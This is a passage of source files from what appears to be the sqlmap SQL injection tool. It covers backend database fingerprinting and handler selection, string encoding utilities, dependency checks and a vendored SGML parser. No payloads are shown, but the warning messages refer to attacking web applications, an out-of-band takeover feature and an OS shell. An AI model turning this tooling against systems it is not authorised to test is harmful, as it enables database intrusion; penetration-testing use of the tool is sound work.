lib.core.settings import MIMERSQL_ALIASES\nfrom lib.core.settings import MONETDB_ALIASES\nfrom lib.core.settings import MSSQL_ALIASES\nfrom lib.core.settings import MYSQL_ALIASES\nfrom lib.core.settings import ORACLE_ALIASES\nfrom lib.core.settings import PGSQL_ALIASES\nfrom lib.core.settings import PRESTO_ALIASES\nfrom lib.core.settings import RAIMA_ALIASES\nfrom lib.core.settings import SQLITE_ALIASES\nfrom lib.core.settings import SYBASE_ALIASES\nfrom lib.core.settings import VERTICA_ALIASES\nfrom lib.core.settings import VIRTUOSO_ALIASES\nfrom lib.utils.sqlalchemy import SQLAlchemy\n\nfrom plugins.dbms.access.connector import Connector as AccessConn\nfrom plugins.dbms.access import AccessMap\nfrom plugins.dbms.altibase.connector import Connector as AltibaseConn\nfrom plugins.dbms.altibase import AltibaseMap\nfrom plugins.dbms.cache.connector import Connector as CacheConn\nfrom plugins.dbms.cache import CacheMap\nfrom plugins.dbms.clickhouse.connector import Connector as ClickHouseConn\nfrom plugins.dbms.clickhouse import ClickHouseMap\nfrom plugins.dbms.cratedb.connector import Connector as CrateDBConn\nfrom plugins.dbms.cratedb import CrateDBMap\nfrom plugins.dbms.cubrid.connector import Connector as CubridConn\nfrom plugins.dbms.cubrid import CubridMap\nfrom plugins.dbms.db2.connector import Connector as DB2Conn\nfrom plugins.dbms.db2 import DB2Map\nfrom plugins.dbms.derby.connector import Connector as DerbyConn\nfrom plugins.dbms.derby import DerbyMap\nfrom plugins.dbms.extremedb.connector import Connector as ExtremeDBConn\nfrom plugins.dbms.extremedb import ExtremeDBMap\nfrom plugins.dbms.firebird.connector import Connector as FirebirdConn\nfrom plugins.dbms.firebird import FirebirdMap\nfrom plugins.dbms.frontbase.connector import Connector as FrontBaseConn\nfrom plugins.dbms.frontbase import FrontBaseMap\nfrom plugins.dbms.h2.connector import Connector as H2Conn\nfrom plugins.dbms.h2 import H2Map\nfrom plugins.dbms.hsqldb.connector import Connector as HSQLDBConn\nfrom plugins.dbms.hsqldb import HSQLDBMap\nfrom plugins.dbms.informix.connector import Connector as InformixConn\nfrom plugins.dbms.informix import InformixMap\nfrom plugins.dbms.maxdb.connector import Connector as MaxDBConn\nfrom plugins.dbms.maxdb import MaxDBMap\nfrom plugins.dbms.mckoi.connector import Connector as MckoiConn\nfrom plugins.dbms.mckoi import MckoiMap\nfrom plugins.dbms.mimersql.connector import Connector as MimerSQLConn\nfrom plugins.dbms.mimersql import MimerSQLMap\nfrom plugins.dbms.monetdb.connector import Connector as MonetDBConn\nfrom plugins.dbms.monetdb import MonetDBMap\nfrom plugins.dbms.mssqlserver.connector import Connector as MSSQLServerConn\nfrom plugins.dbms.mssqlserver import MSSQLServerMap\nfrom plugins.dbms.mysql.connector import Connector as MySQLConn\nfrom plugins.dbms.mysql import MySQLMap\nfrom plugins.dbms.oracle.connector import Connector as OracleConn\nfrom plugins.dbms.oracle import OracleMap\nfrom plugins.dbms.postgresql.connector import Connector as PostgreSQLConn\nfrom plugins.dbms.postgresql import PostgreSQLMap\nfrom plugins.dbms.presto.connector import Connector as PrestoConn\nfrom plugins.dbms.presto import PrestoMap\nfrom plugins.dbms.raima.connector import Connector as RaimaConn\nfrom plugins.dbms.raima import RaimaMap\nfrom plugins.dbms.sqlite.connector import Connector as SQLiteConn\nfrom plugins.dbms.sqlite import SQLiteMap\nfrom plugins.dbms.sybase.connector import Connector as SybaseConn\nfrom plugins.dbms.sybase import SybaseMap\nfrom plugins.dbms.vertica.connector import Connector as VerticaConn\nfrom plugins.dbms.vertica import VerticaMap\nfrom plugins.dbms.virtuoso.connector import Connector as VirtuosoConn\nfrom plugins.dbms.virtuoso import VirtuosoMap\n\ndef setHandler():\n    \"\"\"\n    Detect which is the target web application back-end database\n    management system.\n    \"\"\"\n\n    items = [\n        (DBMS.MYSQL, MYSQL_ALIASES, MySQLMap, MySQLConn),\n        (DBMS.ORACLE, ORACLE_ALIASES, OracleMap, OracleConn),\n        (DBMS.PGSQL, PGSQL_ALIASES, PostgreSQLMap, PostgreSQLConn),\n        (DBMS.MSSQL, MSSQL_ALIASES, MSSQLServerMap, MSSQLServerConn),\n        (DBMS.SQLITE, SQLITE_ALIASES, SQLiteMap, SQLiteConn),\n        (DBMS.ACCESS, ACCESS_ALIASES, AccessMap, AccessConn),\n        (DBMS.FIREBIRD, FIREBIRD_ALIASES, FirebirdMap, FirebirdConn),\n        (DBMS.MAXDB, MAXDB_ALIASES, MaxDBMap, MaxDBConn),\n        (DBMS.SYBASE, SYBASE_ALIASES, SybaseMap, SybaseConn),\n        (DBMS.DB2, DB2_ALIASES, DB2Map, DB2Conn),\n        (DBMS.HSQLDB, HSQLDB_ALIASES, HSQLDBMap, HSQLDBConn),\n        (DBMS.H2, H2_ALIASES, H2Map, H2Conn),\n        (DBMS.INFORMIX, INFORMIX_ALIASES, InformixMap, InformixConn),\n        (DBMS.MONETDB, MONETDB_ALIASES, MonetDBMap, MonetDBConn),\n        (DBMS.DERBY, DERBY_ALIASES, DerbyMap, DerbyConn),\n        (DBMS.VERTICA, VERTICA_ALIASES, VerticaMap, VerticaConn),\n        (DBMS.MCKOI, MCKOI_ALIASES, MckoiMap, MckoiConn),\n        (DBMS.PRESTO, PRESTO_ALIASES, PrestoMap, PrestoConn),\n        (DBMS.ALTIBASE, ALTIBASE_ALIASES, AltibaseMap, AltibaseConn),\n        (DBMS.MIMERSQL, MIMERSQL_ALIASES, MimerSQLMap, MimerSQLConn),\n        (DBMS.CLICKHOUSE, CLICKHOUSE_ALIASES, ClickHouseMap, ClickHouseConn),\n        (DBMS.CRATEDB, CRATEDB_ALIASES, CrateDBMap, CrateDBConn),\n        (DBMS.CUBRID, CUBRID_ALIASES, CubridMap, CubridConn),\n        (DBMS.CACHE, CACHE_ALIASES, CacheMap, CacheConn),\n        (DBMS.EXTREMEDB, EXTREMEDB_ALIASES, ExtremeDBMap, ExtremeDBConn),\n        (DBMS.FRONTBASE, FRONTBASE_ALIASES, FrontBaseMap, FrontBaseConn),\n        (DBMS.RAIMA, RAIMA_ALIASES, RaimaMap, RaimaConn),\n        (DBMS.VIRTUOSO, VIRTUOSO_ALIASES, VirtuosoMap, VirtuosoConn),\n    ]\n\n    _ = max(_ if (conf.get(\"dbms\") or Backend.getIdentifiedDbms() or kb.heuristicExtendedDbms or \"\").lower() in _[1] else () for _ in items)\n    if _:\n        items.remove(_)\n        items.insert(0, _)\n\n    for dbms, aliases, Handler, Connector in items:\n        if conf.forceDbms:\n            if conf.forceDbms.lower() not in aliases:\n                continue\n            else:\n                kb.dbms = conf.dbms = conf.forceDbms = dbms\n\n        if kb.dbmsFilter:\n            if dbms not in kb.dbmsFilter:\n                continue\n\n        handler = Handler()\n        conf.dbmsConnector = Connector()\n\n        if conf.direct:\n            exception = None\n            dialect = DBMS_DICT[dbms][3]\n\n            if dialect:\n                try:\n                    sqlalchemy = SQLAlchemy(dialect=dialect)\n                    sqlalchemy.connect()\n\n                    if sqlalchemy.connector:\n                        conf.dbmsConnector = sqlalchemy\n                except Exception as ex:\n                    exception = ex\n\n            if not dialect or exception:\n                try:\n                    conf.dbmsConnector.connect()\n                except Exception as ex:\n                    if exception:\n                        raise exception\n                    else:\n                        if not isinstance(ex, NameError):\n                            raise\n                        else:\n                            msg = \"support for direct connection to '%s' is not available. \" % dbms\n                            msg += \"Please rerun with '--dependencies'\"\n                            raise SqlmapConnectionException(msg)\n\n        if conf.forceDbms == dbms or handler.checkDbms():\n            if kb.resolutionDbms:\n                conf.dbmsHandler = max(_ for _ in items if _[0] == kb.resolutionDbms)[2]()\n                conf.dbmsHandler._dbms = kb.resolutionDbms\n            else:\n                conf.dbmsHandler = handler\n                conf.dbmsHandler._dbms = dbms\n\n            break\n        else:\n            conf.dbmsConnector = None\n\n    # At this point back-end DBMS is correctly fingerprinted, no need\n    # to enforce it anymore\n    Backend.flushForcedDbms()\n", "lib/utils/safe2bin.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport binascii\nimport re\nimport string\nimport sys\n\nPY3 = sys.version_info >= (3, 0)\n\nif PY3:\n    xrange = range\n    text_type = str\n    string_types = (str,)\n    unichr = chr\nelse:\n    text_type = unicode\n    string_types = (basestring,)\n\n# Regex used for recognition of hex encoded characters\nHEX_ENCODED_CHAR_REGEX = r\"(?P<result>\\\\x[0-9A-Fa-f]{2})\"\n\n# Raw chars that will be safe encoded to their slash (\\) representations (e.g. newline to \\n)\nSAFE_ENCODE_SLASH_REPLACEMENTS = \"\\t\\n\\r\\x0b\\x0c\"\n\n# Characters that don't need to be safe encoded\nSAFE_CHARS = \"\".join([_ for _ in string.printable.replace('\\\\', '') if _ not in SAFE_ENCODE_SLASH_REPLACEMENTS])\n\n# Prefix used for hex encoded values\nHEX_ENCODED_PREFIX = r\"\\x\"\n\n# Strings used for temporary marking of hex encoded prefixes (to prevent double encoding)\nHEX_ENCODED_PREFIX_MARKER = \"__HEX_ENCODED_PREFIX__\"\n\n# String used for temporary marking of slash characters\nSLASH_MARKER = \"__SLASH__\"\n\ndef safecharencode(value):\n    \"\"\"\n    Returns safe representation of a given basestring value\n\n    >>> safecharencode(u'test123') == u'test123'\n    True\n    >>> safecharencode(u'test\\x01\\x02\\xaf') == u'test\\\\\\\\x01\\\\\\\\x02\\\\xaf'\n    True\n    \"\"\"\n\n    retVal = value\n\n    if isinstance(value, string_types):\n        if any(_ not in SAFE_CHARS for _ in value):\n            retVal = retVal.replace(HEX_ENCODED_PREFIX, HEX_ENCODED_PREFIX_MARKER)\n            retVal = retVal.replace('\\\\', SLASH_MARKER)\n\n            for char in SAFE_ENCODE_SLASH_REPLACEMENTS:\n                retVal = retVal.replace(char, repr(char).strip('\\''))\n\n            for char in set(retVal):\n                if not (char in string.printable or isinstance(value, text_type) and ord(char) >= 160):\n                    retVal = retVal.replace(char, '\\\\x%02x' % ord(char))\n\n            retVal = retVal.replace(SLASH_MARKER, \"\\\\\\\\\")\n            retVal = retVal.replace(HEX_ENCODED_PREFIX_MARKER, HEX_ENCODED_PREFIX)\n    elif isinstance(value, list):\n        for i in xrange(len(value)):\n            retVal[i] = safecharencode(value[i])\n\n    return retVal\n\ndef safechardecode(value, binary=False):\n    \"\"\"\n    Reverse function to safecharencode\n    \"\"\"\n\n    retVal = value\n    if isinstance(value, string_types):\n        retVal = retVal.replace('\\\\\\\\', SLASH_MARKER)\n\n        while True:\n            match = re.search(HEX_ENCODED_CHAR_REGEX, retVal)\n            if match:\n                retVal = retVal.replace(match.group(\"result\"), unichr(ord(binascii.unhexlify(match.group(\"result\").lstrip(\"\\\\x\")))))\n            else:\n                break\n\n        for char in SAFE_ENCODE_SLASH_REPLACEMENTS[::-1]:\n            retVal = retVal.replace(repr(char).strip('\\''), char)\n\n        retVal = retVal.replace(SLASH_MARKER, '\\\\')\n\n        if binary:\n            if isinstance(retVal, text_type):\n                retVal = retVal.encode(\"utf8\", errors=\"surrogatepass\" if PY3 else \"strict\")\n\n    elif isinstance(value, (list, tuple)):\n        for i in xrange(len(value)):\n            retVal[i] = safechardecode(value[i])\n\n    return retVal\n", "lib/utils/deps.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.data import logger\nfrom lib.core.dicts import DBMS_DICT\nfrom lib.core.enums import DBMS\nfrom lib.core.settings import IS_WIN\n\ndef checkDependencies():\n    missing_libraries = set()\n\n    for dbmsName, data in DBMS_DICT.items():\n        if data[1] is None:\n            continue\n\n        try:\n            if dbmsName in (DBMS.MSSQL, DBMS.SYBASE):\n                __import__(\"_mssql\")\n\n                pymssql = __import__(\"pymssql\")\n                if not hasattr(pymssql, \"__version__\") or pymssql.__version__ < \"1.0.2\":\n                    warnMsg = \"'%s' third-party library must be \" % data[1]\n                    warnMsg += \"version >= 1.0.2 to work properly. \"\n                    warnMsg += \"Download from '%s'\" % data[2]\n                    logger.warning(warnMsg)\n            elif dbmsName == DBMS.MYSQL:\n                __import__(\"pymysql\")\n            elif dbmsName in (DBMS.PGSQL, DBMS.CRATEDB):\n                __import__(\"psycopg2\")\n            elif dbmsName == DBMS.ORACLE:\n                __import__(\"cx_Oracle\")\n            elif dbmsName == DBMS.SQLITE:\n                __import__(\"sqlite3\")\n            elif dbmsName == DBMS.ACCESS:\n                __import__(\"pyodbc\")\n            elif dbmsName == DBMS.FIREBIRD:\n                __import__(\"kinterbasdb\")\n            elif dbmsName == DBMS.DB2:\n                __import__(\"ibm_db_dbi\")\n            elif dbmsName in (DBMS.HSQLDB, DBMS.CACHE):\n                __import__(\"jaydebeapi\")\n                __import__(\"jpype\")\n            elif dbmsName == DBMS.INFORMIX:\n                __import__(\"ibm_db_dbi\")\n            elif dbmsName == DBMS.MONETDB:\n                __import__(\"pymonetdb\")\n            elif dbmsName == DBMS.DERBY:\n                __import__(\"drda\")\n            elif dbmsName == DBMS.VERTICA:\n                __import__(\"vertica_python\")\n            elif dbmsName == DBMS.PRESTO:\n                __import__(\"prestodb\")\n            elif dbmsName == DBMS.MIMERSQL:\n                __import__(\"mimerpy\")\n            elif dbmsName == DBMS.CUBRID:\n                __import__(\"CUBRIDdb\")\n            elif dbmsName == DBMS.CLICKHOUSE:\n                __import__(\"clickhouse_connect\")       \n        except:\n            warnMsg = \"sqlmap requires '%s' third-party library \" % data[1]\n            warnMsg += \"in order to directly connect to the DBMS \"\n            warnMsg += \"'%s'. Download from '%s'\" % (dbmsName, data[2])\n            logger.warning(warnMsg)\n            missing_libraries.add(data[1])\n\n            continue\n\n        debugMsg = \"'%s' third-party library is found\" % data[1]\n        logger.debug(debugMsg)\n\n    try:\n        __import__(\"impacket\")\n        debugMsg = \"'python-impacket' third-party library is found\"\n        logger.debug(debugMsg)\n    except ImportError:\n        warnMsg = \"sqlmap requires 'python-impacket' third-party library for \"\n        warnMsg += \"out-of-band takeover feature. Download from \"\n        warnMsg += \"'https://github.com/coresecurity/impacket'\"\n        logger.warning(warnMsg)\n        missing_libraries.add('python-impacket')\n\n    try:\n        __import__(\"ntlm\")\n        debugMsg = \"'python-ntlm' third-party library is found\"\n        logger.debug(debugMsg)\n    except ImportError:\n        warnMsg = \"sqlmap requires 'python-ntlm' third-party library \"\n        warnMsg += \"if you plan to attack a web application behind NTLM \"\n        warnMsg += \"authentication. Download from 'https://github.com/mullender/python-ntlm'\"\n        logger.warning(warnMsg)\n        missing_libraries.add('python-ntlm')\n\n    try:\n        __import__(\"websocket._abnf\")\n        debugMsg = \"'websocket-client' library is found\"\n        logger.debug(debugMsg)\n    except ImportError:\n        warnMsg = \"sqlmap requires 'websocket-client' third-party library \"\n        warnMsg += \"if you plan to attack a web application using WebSocket. \"\n        warnMsg += \"Download from 'https://pypi.python.org/pypi/websocket-client/'\"\n        logger.warning(warnMsg)\n        missing_libraries.add('websocket-client')\n\n    try:\n        __import__(\"tkinter\")\n        debugMsg = \"'tkinter' library is found\"\n        logger.debug(debugMsg)\n    except ImportError:\n        warnMsg = \"sqlmap requires 'tkinter' library \"\n        warnMsg += \"if you plan to run a GUI\"\n        logger.warning(warnMsg)\n        missing_libraries.add('tkinter')\n\n    try:\n        __import__(\"tkinter.ttk\")\n        debugMsg = \"'tkinter.ttk' library is found\"\n        logger.debug(debugMsg)\n    except ImportError:\n        warnMsg = \"sqlmap requires 'tkinter.ttk' library \"\n        warnMsg += \"if you plan to run a GUI\"\n        logger.warning(warnMsg)\n        missing_libraries.add('tkinter.ttk')\n\n    if IS_WIN:\n        try:\n            __import__(\"pyreadline\")\n            debugMsg = \"'python-pyreadline' third-party library is found\"\n            logger.debug(debugMsg)\n        except ImportError:\n            warnMsg = \"sqlmap requires 'pyreadline' third-party library to \"\n            warnMsg += \"be able to take advantage of the sqlmap TAB \"\n            warnMsg += \"completion and history support features in the SQL \"\n            warnMsg += \"shell and OS shell. Download from \"\n            warnMsg += \"'https://pypi.org/project/pyreadline/'\"\n            logger.warning(warnMsg)\n            missing_libraries.add('python-pyreadline')\n\n    if len(missing_libraries) == 0:\n        infoMsg = \"all dependencies are installed\"\n        logger.info(infoMsg)\n", "lib/utils/versioncheck.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport sys\nimport time\n\nPYVERSION = sys.version.split()[0]\n\nif PYVERSION < \"2.6\":\n    sys.exit(\"[%s] [CRITICAL] incompatible Python version detected ('%s'). To successfully run sqlmap you'll have to use version 2.6, 2.7 or 3.x (visit 'https://www.python.org/downloads/')\" % (time.strftime(\"%X\"), PYVERSION))\n\nerrors = []\nextensions = (\"bz2\", \"gzip\", \"pyexpat\", \"ssl\", \"sqlite3\", \"zlib\")\nfor _ in extensions:\n    try:\n        __import__(_)\n    except ImportError:\n        errors.append(_)\n\nif errors:\n    errMsg = \"[%s] [CRITICAL] missing one or more core extensions (%s) \" % (time.strftime(\"%X\"), \", \".join(\"'%s'\" % _ for _ in errors))\n    errMsg += \"most likely because current version of Python has been \"\n    errMsg += \"built without appropriate dev packages\"\n    sys.exit(errMsg)\n", "lib/utils/sgmllib.py": "\"\"\"A parser for SGML, using the derived class as a static DTD.\"\"\"\n\n# Note: missing in Python3\n\n# XXX This only supports those SGML features used by HTML.\n\n# XXX There should be a way to distinguish between PCDATA (parsed\n# character data -- the normal case), RCDATA (replaceable character\n# data -- only char and entity references and end tags are special)\n# and CDATA (character data -- only end tags are special).  RCDATA is\n# not supported at all.\n\nfrom __future__ import print_function\n\ntry:\n    import _markupbase as markupbase\nexcept:\n    import markupbase\n\nimport re\n\n__all__ = [\"SGMLParser\", \"SGMLParseError\"]\n\n# Regular expressions used for parsing\n\ninteresting = re.compile('[&<]')\nincomplete = re.compile('&([a-zA-Z][a-zA-Z0-9]*|#[0-9]*)?|'\n                        '<([a-zA-Z][^<>]*|'\n                        '/([a-zA-Z][^<>]*)?|'\n                        '![^<>]*)?')\n\nentityref = re.compile('&([a-zA-Z][-.a-zA-Z0-9]*)[^a-zA-Z0-9]')\ncharref = re.compile('&#([0-9]+)[^0-9]')\n\nstarttagopen = re.compile('<[>a-zA-Z]')\nshorttagopen = re.compile('<[a-zA-Z][-.a-zA-Z0-9]*/')\nshorttag = re.compile('<([a-zA-Z][-.a-zA-Z0-9]*)/([^/]*)/')\npiclose = re.compile('>')\nendbracket = re.compile('[<>]')\ntagfind = re.compile('[a-zA-Z][-_.a-zA-Z0-9]*')\nattrfind = re.compile(\n    r'\\s*([a-zA-Z_][-:.a-zA-Z_0-9]*)(\\s*=\\s*'\n    r'(\\'[^\\']*\\'|\"[^\"]*\"|[][\\-a-zA-Z0-9./,:;+*%?!&$\\(\\)_#=~\\'\"@]*))?')\n\n\nclass SGMLParseError(RuntimeError):\n    \"\"\"Exception raised for all parse errors.\"\"\"\n    pass\n\n\n# SGML parser base class -- find tags and call handler functions.\n# Usage: p = SGMLParser(); p.feed(data); ...; p.close().\n# The dtd is defined by deriving a class which defines methods\n# with special names to handle tags: start_foo and end_foo to handle\n# <foo> and </foo>, respectively, or do_foo to handle <foo> by itself.\n# (Tags are converted to lower case for this purpose.)  The data\n# between tags is passed to the parser by calling self.handle_data()\n# with some data as argument (the data may be split up in arbitrary\n# chunks).  Entity references are passed by calling\n# self.handle_entityref() with the entity reference as argument.\n\nclass SGMLParser(markupbase.ParserBase):\n    # Definition of entities -- derived classes may override\n    entity_or_charref = re.compile('&(?:'\n                                   '([a-zA-Z][-.a-zA-Z0-9]*)|#([0-9]+)'\n                                   ')(;?)')\n\n    def __init__(self, verbose=0):\n        \"\"\"Initialize and reset this instance.\"\"\"\n        self.verbose = verbose\n        self.reset()\n\n    def reset(self):\n        \"\"\"Reset this instance. Loses all unprocessed data.\"\"\"\n        self.__starttag_text = None\n        self.rawdata = ''\n        self.stack = []\n        self.lasttag = '???'\n        self.nomoretags = 0\n        self.literal = 0\n        markupbase.ParserBase.reset(self)\n\n    def setnomoretags(self):\n        \"\"\"Enter literal mode (CDATA) till EOF.\n\n        Intended for derived classes only.\n        \"\"\"\n        self.nomoretags = self.literal = 1\n\n    def setliteral(self, *args):\n        \"\"\"Enter literal mode (CDATA).\n\n        Intended for derived classes only.\n        \"\"\"\n        self.literal = 1\n\n    def feed(self, data):\n        \"\"\"Feed some data to the parser.\n\n        Call this as often as you want, with as little or as much text\n        as you want (may include '\\n').  (This just saves the text,\n        all the processing is done by goahead().)\n        \"\"\"\n\n        self.rawdata = self.rawdata + data\n        self.goahead(0)\n\n    def close(self):\n        \"\"\"Handle the remaining data.\"\"\"\n        self.goahead(1)\n\n    def error(self, message):\n        raise SGMLParseError(message)\n\n    # Internal -- handle data as far as reasonable.  May leave state\n    # and data to be processed by a subsequent call.  If 'end' is\n    # true, force handling all data as if followed by EOF marker.\n    def goahead(self, end):\n        rawdata = self.rawdata\n        i = 0\n        n = len(rawdata)\n        while i < n:\n            if self.nomoretags:\n                self.handle_data(rawdata[i:n])\n                i = n\n                break\n            match = interesting.search(rawdata, i)\n            if match:\n                j = match.start()\n            else:\n                j = n\n            if i < j:\n                self.handle_data(rawdata[i:j])\n            i = j\n            if i == n:\n                break\n            if rawdata[i] == '<':\n                if starttagopen.match(rawdata, i):\n                    if self.literal:\n                        self.handle_data(rawdata[i])\n                        i = i + 1\n                        continue\n                    k = self.parse_starttag(i)\n                    if k < 0:\n                        break\n                    i = k\n                    continue\n                if rawdata.startswith(\"</\", i):\n                    k = self.parse_endtag(i)\n                    if k < 0:\n                        break\n                    i = k\n                    self.literal = 0\n                    continue\n                if self.literal:\n                    if n > (i + 1):\n                        self.handle_data(\"<\")\n                        i = i + 1\n                    else:\n                        # incomplete\n                        break\n                    continue\n                if rawdata.startswith(\"<!--\", i):\n                        # Strictly speaking, a comment is --.*--\n                        # within a declaration tag <!...>.\n                        # This should be removed,\n                        # and comments handled only in parse_declaration.\n                    k = self.parse_comment(i)\n                    if k < 0:\n                        break\n                    i = k\n                    continue\n                if rawdata.startswith(\"<?\", i):\n                    k = self.parse_pi(i)\n                    if k < 0:\n                        break\n                    i = i + k\n                    continue\n                if rawdata.startswith(\"<!\", i):\n                    # This is some sort of declaration; in \"HTML as\n                    # deployed,\" this should only be the document type\n                    # declaration (\"<!DOCTYPE html...>\").\n                    k = self.parse_declaration(i)\n                    if k < 0:\n                        break\n                    i = k\n                    continue\n            elif rawdata[i] == '&':\n                if self.literal:\n                    self.handle_data(rawdata[i])\n                    i = i + 1\n                    continue\n                match = charref.match(rawdata, i)\n                if match:\n                    name = match.group(1)\n                    self.handle_charref(name)\n                    i = match.end(0)\n                    if rawdata[i - 1] != ';':\n                        i = i - 1\n                    continue\n                match = entityref.match(rawdata, i)\n                if match:\n                    name = match.group(1)\n                    self.handle_entityref(name)\n                    i = match.end(0)\n                    if rawdata[i - 1] != ';':\n                        i = i - 1\n                    continue\n            else:\n                self.error('neither < nor & ??')\n            # We get here only if incomplete matches but\n            # nothing else\n            match = incomplete.match(rawdata, i)\n            if not match:\n                self.handle_data(rawdata[i])\n                i = i + 1\n                continue\n            j = match.end(0)\n            if j == n:\n                break  # Really incomplete\n            self.handle_data(rawdata[i:j])\n            i = j\n        # end while\n        if end and i < n:\n            self.handle_data(rawdata[i:n])\n            i = n\n        self.rawdata = rawdata[i:]\n        # XXX if end: check for empty stack\n\n    # Extensions for the DOCTYPE scanner:\n    _decl_otherchars = '='\n\n    # Internal -- parse processing instr, return length or -1 if not terminated\n    def parse_pi(self, i):\n        rawdata = self.rawdata\n        if rawdata[i:i + 2] != '<?':\n            self.error('unexpected call to parse_pi()')\n        match = piclose.search(rawdata, i + 2)\n        if not match:\n            return -1\n        j = match.start(0)\n        self.handle_pi(rawdata[i + 2: j])\n        j = match.end(0)\n        return j - i\n\n    def get_starttag_text(self):\n        return self.__starttag_text\n\n    # Internal -- handle starttag, return length or -1 if not terminated\n    def parse_starttag(self, i):\n        self.__starttag_text = None\n        start_pos = i\n        rawdata = self.rawdata\n        if shorttagopen.match(rawdata, i):\n            # SGML shorthand: <tag/data/ == <tag>data</tag>\n            # XXX Can data contain &... (entity or char refs)?\n            # XXX Can data contain < or > (tag characters)?\n            # XXX Can there be whitespace before the first /?\n            match = shorttag.match(rawdata, i)\n            if not match:\n                return -1\n            tag, data = match.group(1, 2)\n            self.__starttag_text = '<%s/' % tag\n            tag = tag.lower()\n            k = match.end(0)\n            self.finish_shorttag(tag, data)\n            self.__starttag_text = rawdata[start_pos:match.end(1) + 1]\n            return k\n        # XXX The following should skip matching quotes (' or \")\n        # As a shortcut way to exit, this isn't so bad, but shouldn't\n        # be used to locate the actual end of the start tag since the\n        # < or > characters may be embedded in an attribute value.\n        match = endbracket.search(rawdata, i + 1)\n        if not match:\n            return -1\n        j = match.start(0)\n        # Now parse the data between i + 1 and j into a tag and attrs\n        attrs = []\n        if rawdata[i:i + 2] == '<>':\n            # SGML shorthand: <> == <last open tag seen>\n            k = j\n            tag = self.lasttag\n        else:\n            match = tagfind.match(rawdata, i + 1)\n            if not match:\n                self.error('unexpected call to parse_starttag')\n            k = match.end(0)\n            tag = rawdata[i + 1:k].lower()\n            self.lasttag = tag\n        while k < j:\n            match = attrfind.match(rawdata, k)\n            if not match:\n                break\n            attrname, rest, attrvalue = match.group(1, 2, 3)\n            if not rest:\n                attrvalue = attrname\n            else:\n                if (attrvalue[:1] == \"'\" == attrvalue[-1:] or\n                   attrvalue[:1] == '\"' == attrvalue[-1:]):\n                    # strip quotes\n                    attrvalue = attrvalue[1:-1]\n                attrvalue = self.entity_or_charref.sub(\n                    self._convert_ref, attrvalue)\n            attrs.append((attrname.lower(), attrvalue))\n            k = match.end(0)\n        if rawdata[j] == '>':\n            j = j + 1\n        self.__starttag_text = rawdata[start_pos:j]\n        self.finish_starttag(tag, attrs)\n        return j\n\n    # Internal -- convert entity or character reference\n    def _convert_ref(self, match):\n        if match.group(2):\n            return self.convert_charref(match.group(2)) or \\\n                '&#%s%s' % match.groups()[1:]\n        elif match.group(3):\n            return self.convert_entityref(match.group(1)) or \\\n                '&%s;' % match.group(1)\n        else:\n            return '&%s' % match.group(1)\n\n    # Internal -- parse endtag\n    def parse_endtag(self, i):\n        rawdata = self.rawdata\n        match = endbracket.search(rawdata, i + 1)\n        if not match:\n            return -1\n        j = match.start(0)\n        tag = rawdata[i + 2:j].strip().lower()\n        if rawdata[j] == '>':\n            j = j + 1\n        self.finish_endtag(tag)\n        return j\n\n    # Internal -- finish parsing of <tag/data/ (same as <tag>data</tag>)\n    def finish_shorttag(self, tag, data):\n        self.finish_starttag(tag, [])\n        self.handle_data(data)\n        self.finish_endtag(tag)\n\n    # Internal -- finish processing of start tag\n    # Return -1 for unknown tag, 0 for open-only tag, 1 for balanced tag\n    def finish_starttag(self, tag, attrs):\n        try:\n            method = getattr(self, 'start_' + tag)\n        except AttributeError:\n            try:\n                method = getattr(self, 'do_' + tag)\n            except AttributeError:\n                self.unknown_starttag(tag, attrs)\n                return -1\n            else:\n                self.handle_starttag(tag, method, attrs)\n                return 0\n        else:\n            self.stack.append(tag)\n            self.handle_starttag(tag, method, attrs)\n            return 1\n\n    # Internal -- finish processing of end tag\n    def finish_endtag(self, tag):\n        if not tag:\n            found = len(self.stack) - 1\n            if found < 0:\n                self.unknown_endtag(tag)\n                return\n        else:\n            if tag not in self.stack:\n                try:\n                    method = getattr(self, 'end_' + tag)\n                except AttributeError:\n                    self.unknown_endtag(tag)\n                else:\n                    self.report_unbalanced(tag)\n                return\n            found = len(self.stack)\n            for i in range(found):\n                if self.stack[i] == tag:\n                    found = i\n        while len(self.stack) > found:\n            tag = self.stack[-1]\n            try:\n                method = getattr(self, 'end_' + tag)\n            except AttributeError:\n                method = None\n            if method:\n                self.handle_endtag(tag, method)\n            else:\n                self.unknown_endtag(tag)\n            del self.stack[-1]\n\n    # Overridable -- handle start tag\n    def handle_starttag(self, tag, method, attrs):\n        method(attrs)\n\n    # Overridable -- handle end tag\n    def handle_endtag(self, tag, method):\n        method()\n\n    # Example -- report an unbalanced </...> tag.\n    def report_unbalanced(self, tag):\n        if self.verbose:\n            print('*** Unbalanced </' + tag + '>')\n            print('*** Stack:', self.stack)\n\n    def convert_charref(self, name):\n        \"\"\"Convert character reference, may be overridden.\"\"\"\n        try:\n            n = int(name)\n        except ValueError:\n            return\n        if not 0 <= n <= 127:\n            return\n        return self.convert_codepoint(n)\n\n    def convert_codepoint(self, codepoint):\n        return chr(codepoint)\n\n    def handle_charref(self, name):\n        \"\"\"Handle character reference, no need to override.\"\"\"\n        replacement = self.convert_charref(name)\n        if replacement is None:\n            self.unknown_charref(name)\n        else:\n            self.handle_data(replacement)\n\n    # Definition of entities -- derived classes may override\n    entitydefs = \\\n        {'lt': '<', 'gt': '>', 'amp': '&', 'quot': '\"', 'apos': '\\''}\n\n    def convert_entityref(self, name):\n        \"\"\"Convert entity references.\n\n        As an alternative to overriding this method; one can tailor the\n        results by setting up the self.entitydefs mapping appropriately.\n        \"\"\"\n        table = self.entitydefs\n        if name in table:\n            return table[name]\n        else:\n            return\n\n    def handle_entityref(self, name):\n        \"\"\"Handle entity references, no need to override.\"\"\"\n        replacement = self.convert_entityref(name)\n        if replacement is None:\n            self.unknown_entityref(name)\n        else:\n            self.handle_data(replacement)\n\n    # Example -- handle data, should be overridden\n    def handle_data(self, data):\n        pass\n\n    # Example -- handle comment, could be overridden\n    def handle_comment(self, data):\n        pass\n\n    # Example -- handle declaration, could be overridden\n    def handle_decl(self, decl):\n        pass\n\n    # Example -- handle processing 